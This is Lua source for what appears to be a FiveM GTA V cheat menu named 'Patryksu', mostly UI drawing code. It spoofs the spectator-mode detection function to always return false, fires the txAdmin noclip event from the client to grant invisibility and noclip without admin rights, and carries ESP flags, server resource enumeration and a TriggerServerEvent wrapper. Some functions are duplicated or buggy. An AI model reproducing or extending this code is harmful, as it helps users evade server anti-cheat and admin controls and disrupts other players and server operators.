local tytuldziwko = "Patryksu"
local pisellone = PlayerId(-1)
local showblip = false
local showsprite = false
local nameabove = true
local esp = true
local txNoclip = false
local txGodMode = false
local txSuperJump = false
local LR = {}
local a = true
local b = {}
local c = {up = 172, down = 173, left = 174, right = 175, select = 215, back = 194}
local d = 0
local e = nil
local f = nil
local g = 0.11
local h = 0.03
local i = 1.0
local j = 0.038
local k = 0
local l = 0.365
local m = 0.005
local n = 0.005
local TEST30 = false
Citizen.CreateThread(function()
   _G.NetworkIsInSpectatorMode = function()
	   return false
   end
end)

LR.debug = false

function IsAnyDisabledControlJustPressed(group, keyList)
    for _, key in ipairs(keyList) do
        if IsDisabledControlJustPressed(group, key) then
            return true
        end
    end
    return false
end

local function RGB(frequency)
  local result = {}
  local curtime = GetGameTimer() / 2000
  result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
  result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
  result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

  return result
end

local menus = {}
local keys = {
    up     = {172, 241},
    down   = {173, 242},
    left   = {174},
    right  = {175},
    select = {176},
    back   = {177}
}

local optionCount = 1
local currentKey = nil
local currentMenu = nil
local menuWidth = 0.18
local menuWidth2 = 0.178
local menuWidth3 = 0.176
local titleHeight = 0.08
local ikonkad = 0.16
local ikonkas = 0.18
local titleHeight2 = 0.05
local titleHeight3 = 0.046
local titleYOffset = 0.01
local titleScale = 0.5
local buttonHeight = 0.035
local buttonFont = 4
local buttonScale = 0.370
local buttonTextXOffset = 0.002
local buttonTextYOffset = 0.005
local buttonTextYOffset2 = 0.003
local descHeight = 0.035
local descFont = 1
local descXOffset = 0.003
local descScale = 0.370
local MenuWider = nil
local function FgWqg()
  local ouGWmAexz = {}
  for i = 0, GetNumResources() do
      ouGWmAexz[i] = GetResourceByFindIndex(i)
  end
  return ouGWmAexz
end
local RwFbMFt4elf6NNUg0kg = {}
RwFbMFt4elf6NNUg0kg = FgWqg()
local function debugPrint(text)
  if LR.debug then
    Citizen.Trace("[LR] " .. tostring(text))
  end
end

local function debugPrint(text)
  if LR.debug then
    Citizen.Trace("[LR] " .. tostring(text))
  end
end

local function setMenuProperty(id, property, value)
  if id and menus[id] then
    menus[id][property] = value
    debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
  end
end

local function isMenuVisible(id)
  if id and menus[id] then
    return menus[id].visible
  else
    return false
  end
end

local function setMenuVisible(id, visible, holdCurrent)
  if id and menus[id] then
    setMenuProperty(id, "visible", visible)

    if not holdCurrent and menus[id] then
      setMenuProperty(id, "currentOption", 1)
    end

    if visible then
      if id ~= currentMenu and isMenuVisible(currentMenu) then
        setMenuVisible(currentMenu, false)
      end

      currentMenu = id
    end
  end
end
-- Funkcja toggle noclipa
function txadminnoclip()
    if IsDisabledControlJustPressed(0, 170) then -- F3
        local ped = PlayerPedId()
        if not txNoclip then
            SetEntityVisible(ped, false, 0)
            TriggerEvent('txcl:setPlayerMode', 'noclip', true)
            txNoclip = true
            txGodMode = false
            txSuperJump = false
        else
            SetEntityVisible(ped, true, 0)
            TriggerEvent('txcl:setPlayerMode', 'none', true)
            txNoclip = false
            txGodMode = false
            txSuperJump = false
        end
    end
end

local function ClearTasksKeybind() -- tak chciało mi się
  if IsDisabledControlJustPressed(0, 167) then 
    --[[
    to jest klawisz F6 a po wciśnięciu go się czyszczą taski peda
    czyli np. siedzisz w aucie i ci robi szybką wysiadę
    jesteś zbugowany w jakiejś animacji zatrzymuje ci ją
    nawet nie musi być zbugowana po prostu stopuje animacje
    ]]
    local playerPed = PlayerPedId()
    ClearPedTasksImmediately(playerPed)  
    ClearPedTasks(playerPed)
    ClearPedSecondaryTask(playerPed)
  end
end
-- Pętla sprawdzająca klawisz
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0) -- musi być w pętli, żeby nie zablokować skryptu
        txadminnoclip()
        ClearTasksKeybind()
    end
end)

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
  SetTextColour(color.r, color.g, color.b, color.a)
  SetTextFont(font)
  SetTextScale(scale, scale)

  if shadow then
    SetTextDropShadow(2, 2, 0, 0, 0)
  end

  if menus[currentMenu] then
    if center then
      SetTextCentre(center)
    elseif alignRight then
      SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
      SetTextRightJustify(true)
    end
  end
  SetTextEntry("STRING")
  AddTextComponentString(text)
  DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
  DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight / 0.89
    local x = menus[currentMenu].x + menuWidth / 2
    local y2 = menus[currentMenu].y + titleHeight / 0.89

    if menus[currentMenu].titleBackgroundSprite then
      DrawSprite(
      menus[currentMenu].titleBackgroundSprite.dict,
      menus[currentMenu].titleBackgroundSprite.name,
      x,
      y,
      menuWidth,
      titleHeight,
      0.,
      255,
      255,
      255,
      255
      )
    else
      drawRect(x, y2, menuWidth, titleHeight2, menus[currentMenu].titleColor)
      drawRect(x, y, menuWidth2, titleHeight3, menus[currentMenu].titleBackgroundColor)
    end


    drawText(
    menus[currentMenu].title,
    x,
    y - titleHeight / 3.2 + titleYOffset,
    menus[currentMenu].titleFont,
    menus[currentMenu].titleColor,
    titleScale,
    true
    )
  end
end

local function drawSubTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

    local rgb = RGB(0.5)

    local subTitleColor = {
      r=rgb.r,
      g=rgb.g,
      b=rgb.b,
      a = 200
    }
  end
end

local function drawDescription(desc, descYOffset, ky)
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + descHeight / 2
    local ra = RGB(5.0)
    local descriptionColor = {
      r = ra.r,
      g = ra.b,
      b = 255,
      a = 200
    }

    drawRect(x, y + ky, menuWidth, descHeight, descriptionBackgroundColor)

    drawText(
    desc,
    menus[currentMenu].x + descXOffset,
    y - descHeight / 2 + descYOffset + 0.005,
    descFont,
    descriptionColor,
    descScale,
    false
    )
  end
end

local function drawButton(text, subText, subText2)
  local x = menus[currentMenu].x + menuWidth / 2
  local multiplier = nil

  if
  menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
  optionCount <= menus[currentMenu].maxOptionCount
  then
    multiplier = optionCount
  elseif
    optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
    optionCount <= menus[currentMenu].currentOption
    then
      multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
      local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
      local backgroundColor = nil
      local textColor = nil
      local subTextColor = nil
      local shadow = false

      if menus[currentMenu].currentOption == optionCount then
        backgroundColor = menus[currentMenu].menuFocusBackgroundColor
        textColor = menus[currentMenu].menuFocusTextColor
        subTextColor = menus[currentMenu].menuFocusTextColor
      else
        backgroundColor = menus[currentMenu].menuBackgroundColor
        textColor = menus[currentMenu].menuTextColor
        subTextColor = menus[currentMenu].menuSubTextColor
        shadow = true
      end

      drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
      drawText(
      text,
      menus[currentMenu].x + buttonTextXOffset,
      y - (buttonHeight / 2) + buttonTextYOffset,
      buttonFont,
      textColor,
      buttonScale,
      false,
      shadow
      )

      if subText then
        drawText(
        subText,
        menus[currentMenu].x + buttonTextXOffset,
        y - buttonHeight / 2 + buttonTextYOffset,
        buttonFont,
        subTextColor,
        buttonScale,
        false,
        shadow,
        true
        )
      end
      if subText2 then
      drawText(
        subText,
        menus[currentMenu].x + buttonTextXOffset2,
        y - buttonHeight / 3 + buttonTextYOffset2,
        buttonFont,
        subTextColor,
        buttonScale,
        false,
        shadow,
        true
        )
      end
    end
  end

  function LR.CreateMenu(id, title)
  
    

    menus[id] = {}
    menus[id].title = tytuldziwko

    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

menus[id].x = 0.65
menus[id].y = 0.15

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 15
    menus[id].titleFont = 7
    Citizen.CreateThread(
    function()
      while true do
        Citizen.Wait(0)
        local ra = RGB(4.0)
        menus[id].titleColor = {r = 255, g = 255, b = 255, a = 155}
      end
      end)

        menus[id].titleBackgroundSprite = nil
        menus[id].titleBackgroundColor = {r = 20, g = 20, b = 20, a = 200}
        menus[id].titleBackgroundColor2 = {r = 14, g = 14, b = 14, a = 0}
        menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
        menus[id].menuFocusTextColor = {r = 222, g = 222, b = 222, a = 255}
        menus[id].menuBackgroundColor = {r = 24, g = 24, b = 24, a = 200}
        menus[id].menuFocusBackgroundColor = {r = 12, g = 12, b = 12, a = 200}
        menus[id].subTitleBackgroundColor = {r = 0, g = 0, b = 0, a = 200}

        descriptionBackgroundColor =
        {
          r = menus[id].menuBackgroundColor.r,
          g = menus[id].menuBackgroundColor.g,
          b = menus[id].menuBackgroundColor.b,
          a = 125
        }
        menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}

        debugPrint(tostring(id) .. " menu created")
      end

      function LR.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
          LR.CreateMenu(id, menus[parent].title)

          if subTitle then
            setMenuProperty(id, "subTitle", (subTitle))
          else
            setMenuProperty(id, "subTitle", (menus[parent].subTitle))
          end

          setMenuProperty(id, "previousMenu", parent)

          setMenuProperty(id, "x", menus[parent].x)
          setMenuProperty(id, "y", menus[parent].y)
          setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
          setMenuProperty(id, "titleFont", menus[parent].titleFont)
          setMenuProperty(id, "titleColor", menus[parent].titleColor)
          setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
          setMenuProperty(id, "titleBackgroundColor2", menus[parent].titleBackgroundColor2)
          setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
          setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
          setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
          setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
          setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
          setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
          setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
        else
          debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
        end
      end

      function LR.CurrentMenu()
        return currentMenu
      end
      function LR.OpenMenu(id)
        Wait(1)

        if id and menus[id] then
          PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
          setMenuVisible(id, true)

          if menus[id].titleBackgroundSprite then
            RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
              Citizen.Wait(0)
            end
          end

          debugPrint(tostring(id) .. " menu opened")
        else
          debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
        end
      end

      function LR.IsMenuOpened(id)
        return isMenuVisible(id)
      end

      function LR.IsAnyMenuOpened()
        for id, _ in pairs(menus) do
          if isMenuVisible(id) then
            return true
          end
        end

        return false
      end

      function LR.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
          return menus[currentMenu].aboutToBeClosed
        else
          return false
        end
      end

      function LR.CloseMenu()
        if menus[currentMenu] then
          if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
          else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu) .. " menu about to be closed")
          end
        end
      end

      function LR.Button(text, subText)
        local buttonText = text
        if subText then
          buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
        end

        if menus[currentMenu] then
          optionCount = optionCount + 1

          local isCurrent = menus[currentMenu].currentOption == optionCount

          drawButton(text, subText)

          if isCurrent then
            if currentKey == keys.select then
              PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
              debugPrint(buttonText .. " button pressed")
              return true
            elseif currentKey == keys.left or currentKey == keys.right then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
          end

          return false
        else
          debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

          return false
        end
      end

      function LR.MenuButton(text, id)
        if menus[id] then
          if LR.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
          end
        else
          debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
        end

        return false
      end

      function LR.CheckBox(Subtext2, bool, callback)
        local checked = "~m~OFF"
        if bool then
          checked = "~w~ON"
        end

        if LR.Button(Subtext2, checked) then
          bool = not bool
          debugPrint(tostring(Subtext2) .. " checkbox changed to " .. tostring(bool))
          callback(bool)

          return true
        end

        return false
      end

      local function revO()
        MenuWider = 0
      end

      function LR.ComboBox(text, items, noclip3, noclip4, callback)
        local itemsCount = #items
        local selectedItem = items[noclip3]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 10)

        if itemsCount > 10 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

        if LR.Button(text, selectedItem) then
          noclip4 = noclip3
          callback(noclip3, noclip4)
          return true
        elseif isCurrent then
          if currentKey == keys.left then
            if noclip3 > 10 then
              noclip3 = noclip3 - 10
            else
              noclip3 = itemsCount
            end
          elseif currentKey == keys.right then
            if noclip3 < itemsCount then
              noclip3 = noclip3 + 10
            else
              noclip3x = 10
            end
          end
        else
          noclip3 = noclip4
        end

        callback(noclip3, noclip4)
        return false
      end

      function LR.ComboBox(text, items, heal3, heal4, callback)
        local itemsCount = #items
        local selectedItem = items[heal3]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

        if itemsCount > 1 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

      if LR.Button(text, selectedItem) then
        heal4 = heal3
        callback(heal3, heal4)
        return true
      elseif isCurrent then
        if currentKey == keys.left then
          if heal3 > 1 then
            heal3 = heal3 - 1
          else
            heal3 = itemsCount
          end
        elseif currentKey == keys.right then
          if heal3 < itemsCount then
            heal3 = heal3 + 1
          else
            heal3x = 1
          end
        end
      else
        heal3 = heal4
      end

      callback(heal3, heal4)
      return false
    end

      function LR.ComboBox(text, items, currentIndex, selectedIndex, callback)
        local itemsCount = #items
        local selectedItem = items[currentIndex]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

        if itemsCount > 1 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

        if LR.Button(text, selectedItem) then
          selectedIndex = currentIndex
          callback(currentIndex, selectedIndex)
          return true
        elseif isCurrent then
          if currentKey == keys.left then
            if currentIndex > 1 then
              currentIndex = currentIndex - 1
            else
              currentIndex = itemsCount
            end
          elseif currentKey == keys.right then
            if currentIndex < itemsCount then
              currentIndex = currentIndex + 1
            else
              currentIndex = 1
            end
          end
        else
          currentIndex = selectedIndex
        end

        callback(currentIndex, selectedIndex)
        return false
      end

      function TSE(a,b,c,d,e,f,g,h,i,m)
        TriggerServerEvent(a,b,c,d,e,f,g,h,i,m)
      end

      function LR.Display()
        if isMenuVisible(currentMenu) then
          if menus[currentMenu].aboutToBeClosed then
            LR.CloseMenu()
          else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsAnyDisabledControlJustPressed(0, keys.down) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

              if menus[currentMenu].currentOption < optionCount then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
              else
                menus[currentMenu].currentOption = 1
              end
            elseif IsAnyDisabledControlJustPressed(0, keys.up) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

              if menus[currentMenu].currentOption > 1 then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
              else
                menus[currentMenu].currentOption = optionCount
              end
            elseif IsAnyDisabledControlJustPressed(0, keys.left) then
              currentKey = keys.left
            elseif IsAnyDisabledControlJustPressed(0, keys.right) then
              currentKey = keys.right
            elseif IsAnyDisabledControlJustPressed(0, keys.select) then
              currentKey = keys.select
            elseif IsAnyDisabledControlJustPressed(0, keys.back) then
              if menus[menus[currentMenu].previousMenu] then
                PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                setMenuVisible(menus[currentMenu].previousMenu, true)
              else
                LR.CloseMenu()
              end
            end

            optionCount = 0
          end
        end
      end

      function LR.SetMenuWidth(id, width)
        setMenuProperty(id, "width", width)
      end

      function LR.SetMenuX(id, x)
        setMenuProperty(id, "x", x)
      end

      function LR.SetMenuY(id, y)
        setMenuProperty(id, "y", y)
      end

      function LR.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, "maxOptionCount", count)
      end

      function LR.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
      end

      function LR.SetTitleBackgroundColor2(id, r, g, b, a)
        setMenuProperty(
        id,
        "titleBackgroundColor2",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor2.a}
        )
      end
      function LR.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
        )
      end

      function LR.SetTitleBackgroundSprite(id, textureDict, textureName)
        setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
      end

      function LR.SetSubTitle(id, text)
        setMenuProperty(id, "subTitle", (text))
      end


      function LR.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
        )
      end

      function LR.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
      end

      function LR.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
      end

      function LR.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
      end

      function LR.SetMenuButtonPressedSound(id, name, set)
        setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
      end

      function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
		AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
		DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        while (UpdateOnscreenKeyboard() == 0) do
          DisableAllControlActions(0)
          if IsDisabledControlPressed(0, 322) then return "" end
          Wait(0)
        end
        if (GetOnscreenKeyboardResult()) then
          local result = GetOnscreenKeyboardResult()
          return result
        end
      end

      function EnumeratePickups()
        return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
      end

      function AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
      end

      function SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
      end

      function ScaleVector(vect, mult)
        return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
      end

      function GetSeatPedIsIn(ped)
        if not IsPedInAnyVehicle(ped, false) then return
      else
        veh = GetVehiclePedIsIn(ped)
        for i=0, GetVehicleMaxNumberOfPassengers(veh) do
          if GetPedInVehicleSeat(veh) then return i end
        end
      end
    end

    function GetCamDirFromScreenCenter()
      local pos = GetGameplayCamCoord()
      local world = ScreenToWorld(0, 0)
      local ret = SubVectors(world, pos)
      return ret
    end

    function ScreenToWorld(screenCoord)
      local camRot = GetGameplayCamRot(2)
      local camPos = GetGameplayCamCoord()

      local vect2x = 0.0
      local vect2y = 0.0
      local vect21y = 0.0
      local vect21x = 0.0
      local direction = RotationToDirection(camRot)
      local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

      local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
      local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
      local radians = -(math.rad(camRot.y))

      vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
      vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

      local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
      if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
      end

      local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
      if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
      end

      if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
      end

      local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
      local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
      return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

    end

    function WorldToScreenRel(worldCoords)
      local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
      if not check then
        return false
      end

      screenCoordsx = (x - 0.5) * 2.0
      screenCoordsy = (y - 0.5) * 2.0
      return true, screenCoordsx, screenCoordsy
    end

    function RotationToDirection(rotation)
      local retz = math.rad(rotation.z)
      local retx = math.rad(rotation.x)
      local absx = math.abs(math.cos(retx))
      return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end

    local function GetCamDirection()
      local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
      local pitch = GetGameplayCamRelativePitch()

      local x = -math.sin(heading*math.pi/180.0)
      local y = math.cos(heading*math.pi/180.0)
      local z = math.sin(pitch*math.pi/180.0)

      local len = math.sqrt(x*x+y*y+z*z)
      if len ~= 0 then
        x = x/len
        y = y/len
        z = z/len
      end

      return x,y,z
    end

    local function getPlayerIds()
      local players = {}
      for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
          players[#players + 1] = i
        end
      end
      return players
    end

	local function RandomSkin(target)
		local ped = GetPlayerPed(target)
		SetPedRandomComponentVariation(ped, false)
		SetPedRandomProps(ped)
	end

  local function GetResources()
    local resources = {}
    for i=0, GetNumResources() do
      resources[i] = GetResourceByFindIndex(i)
    end
    return resources
  end

  

	local function ClonePedlol(target)
		local ped = GetPlayerPed(target)
		local me = PlayerPedId()
		
		hat = GetPedPropIndex(ped, 0)
		hat_texture = GetPedPropTextureIndex(ped, 0)
		
		glasses = GetPedPropIndex(ped, 1)
		glasses_texture = GetPedPropTextureIndex(ped, 1)
		
		ear = GetPedPropIndex(ped, 2)
		ear_texture = GetPedPropTextureIndex(ped, 2)
		
		watch = GetPedPropIndex(ped, 6)
		watch_texture = GetPedPropTextureIndex(ped, 6)
		
		wrist = GetPedPropIndex(ped, 7)
		wrist_texture = GetPedPropTextureIndex(ped, 7)
		
		head_drawable = GetPedDrawableVariation(ped, 0)
		head_palette = GetPedPaletteVariation(ped, 0)
		head_texture = GetPedTextureVariation(ped, 0)
		
		beard_drawable = GetPedDrawableVariation(ped, 1)
		beard_palette = GetPedPaletteVariation(ped, 1)
		beard_texture = GetPedTextureVariation(ped, 1)
		
		hair_drawable = GetPedDrawableVariation(ped, 2)
		hair_palette = GetPedPaletteVariation(ped, 2)
		hair_texture = GetPedTextureVariation(ped, 2)
		
		torso_drawable = GetPedDrawableVariation(ped, 3)
		torso_palette = GetPedPaletteVariation(ped, 3)
		torso_texture = GetPedTextureVariation(ped, 3)
		
		legs_drawable = GetPedDrawableVariation(ped, 4)
		legs_palette = GetPedPaletteVariation(ped, 4)
		legs_texture = GetPedTextureVariation(ped, 4)
		
		hands_drawable = GetPedDrawableVariation(ped, 5)
		hands_palette = GetPedPaletteVariation(ped, 5)
		hands_texture = GetPedTextureVariation(ped, 5)
		
		foot_drawable = GetPedDrawableVariation(ped, 6)
		foot_palette = GetPedPaletteVariation(ped, 6)
		foot_texture = GetPedTextureVariation(ped, 6)
		
		acc1_drawable = GetPedDrawableVariation(ped, 7)
		acc1_palette = GetPedPaletteVariation(ped, 7)
		acc1_texture = GetPedTextureVariation(ped, 7)
		
		acc2_drawable = GetPedDrawableVariation(ped, 8)
		acc2_palette = GetPedPaletteVariation(ped, 8)
		acc2_texture = GetPedTextureVariation(ped, 8)
		
		acc3_drawable = GetPedDrawableVariation(ped, 9)
		acc3_palette = GetPedPaletteVariation(ped, 9)
		acc3_texture = GetPedTextureVariation(ped, 9)
		
		mask_drawable = GetPedDrawableVariation(ped, 10)
		mask_palette = GetPedPaletteVariation(ped, 10)
		mask_texture = GetPedTextureVariation(ped, 10)
		
		aux_drawable = GetPedDrawableVariation(ped, 11)
		aux_palette = GetPedPaletteVariation(ped, 11) 	
		aux_texture = GetPedTextureVariation(ped, 11)

		SetPedPropIndex(me, 0, hat, hat_texture, 1)
		SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
		SetPedPropIndex(me, 2, ear, ear_texture, 1)
		SetPedPropIndex(me, 6, watch, watch_texture, 1)
		SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
		
		SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
		SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
		SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
		SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
		SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
		SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
		SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
		SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
		SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
		SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
		SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
		SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
	end


    function DrawText3D(x, y, z, text, r, g, b)
        local onScreen, sx, sy = World3dToScreen2d(x, y, z)
        local px, py, pz = table.unpack(GetGameplayCamCoords())
        local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, true)
        local scale = (1 / dist) * 1.5 -- dynamiczna skala
        
        if onScreen then
            SetTextScale(0.0, 0.35) -- tekst zawsze tej samej wielkości
            SetTextFont(0)
            SetTextProportional(1)
            SetTextColour(r, g, b, 255)
            SetTextCentre(true)
            SetTextOutline()
            SetTextEntry("STRING")
            AddTextComponentString(text)
            DrawText(sx, sy)
        end
    end
    

    function math.round(num, numDecimalPlaces)
      return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
    end

    local function RGB(frequency)
      local result = {}
      local curtime = GetGameTimer() / 1000

      result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
      result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
      result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

      return result
    end

    function notify(text)
      SetNotificationTextEntry("STRING")
      AddTextComponentString(text)
      DrawNotification(true, false)
    end

    function checkValidVehicleExtras()
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}

      for i=0,50,1 do
        if(DoesExtraExist(playerVeh, i))then
          local realModname = "Extra #"..tostring(i)
          local text = "OFF"
          if(IsVehicleExtraTurnedOn(playerVeh, i))then
            text = "ON"
          end
          local realSpawnname = "extra "..tostring(i)
          table.insert(valid, {
            menuName=realModName,
            data ={
              ["action"] = realSpawnName,
              ["state"] = text
            }
          })
        end
      end

      return valid
    end


    function DoesVehicleHaveExtras( veh )
      for i = 1, 30 do
        if ( DoesExtraExist( veh, i ) ) then
          return true
        end
      end

      return false
    end


    function checkValidVehicleMods(modID)
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}
      local modCount = GetNumVehicleMods(playerVeh,modID)
      if (modID == 48 and modCount == 0) then


        local modCount = GetVehicleLiveryCount(playerVeh)
        for i=1, modCount, 1 do
          local realIndex = i - 1
